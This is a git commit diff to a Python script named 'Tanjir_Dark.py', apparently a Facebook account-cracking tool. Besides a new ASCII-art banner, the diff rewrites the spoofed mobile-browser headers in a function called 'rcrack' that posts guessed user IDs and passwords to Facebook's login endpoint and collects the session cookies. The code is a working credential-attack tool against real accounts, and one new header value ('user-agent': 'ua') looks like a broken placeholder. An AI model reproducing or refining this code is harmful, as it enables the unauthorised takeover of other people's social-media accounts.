05d2cfaea9400d23dbcd4204d589061e1ec53c09
tanjirdotx <158843632+tanjirdotx@users.noreply.github.com>
2024-02-05 21:34:41 +0600

    Add files via upload

--- Tanjir_Dark.py
+++ Tanjir_Dark.py
@@ -92,12 +92,14 @@ ha = current.day
 today = date.today()
 os.system('xdg-open https://www.facebook.com/profile.php?id=100084382509686&mibextid=ZbWKwL/')
 logo = ("""
- _____  ____  _         _  _  ____   
-/__ __\/  _ \/ \  /|   / |/ \/  __\  
-  / \  | / \|| |\ ||   | || ||  \/|  
-  | |  | |-||| | \||/\_| || ||    /  
-  \_/  \_/ \|\_/  \|\____/\_/\_/\_\  
-WELCOME MY TOOL """)
+░▒▓████████▓▒░▒▓██████▓▒░░▒▓███████▓▒░       ░▒▓█▓▒░▒▓█▓▒░▒▓███████▓▒░       
+   ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      
+   ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      
+   ░▒▓█▓▒░  ░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░▒▓███████▓▒░       
+   ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      
+   ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      
+   ░▒▓█▓▒░  ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░      
+           """)
 def linex():
 	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
 loop = 0
@@ -565,27 +567,24 @@ def rcrack(uid,pwx,tl):
             "pass":ps,
             "login":"Log In"}
             
-            header_freefb = {'authority': 'm.facebook.com',
-            'method': 'GET',
-            'path': '/',
-            'scheme': 'https',
+            header_freefb = {'Host': 'm.facebook.com',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',   
-            'dpr': '2.75',
-            'sec-ch-prefers-color-scheme': 'light',
-            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
-            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+            'cache-control': 'max-age=0',
+            'dpr': '1.75',
+            'referer': 'https://m.facebook.com/?stype=lo&deoia=1&jlou=AfdpNfIC8D_PfvhEAvQh2EtZQOl46e-LFAzdt2ZivHqxK0yj6rxdQ6fAlMP6oj_KjafNo-rwCP0ws_zCr_76A7V9pkxjs012AykTeBTNjVdf6w&smuh=50786&lh=Ac-YGa9e7OpYsP4y1DI&wtsid=rdr_0wSYy3zPB1AYXnkht&_rdr',
+            'sec-ch-prefers-color-scheme': 'dark',
+            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
             'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-model': '"M2010J19CG"',
             'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"12.0.0"',
+            'sec-ch-ua-platform-version': '"11.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'none',
+            'sec-fetch-site': 'same-origin',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent':pro,
+            'user-agent': 'ua',
             'viewport-width': '980',}
             lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
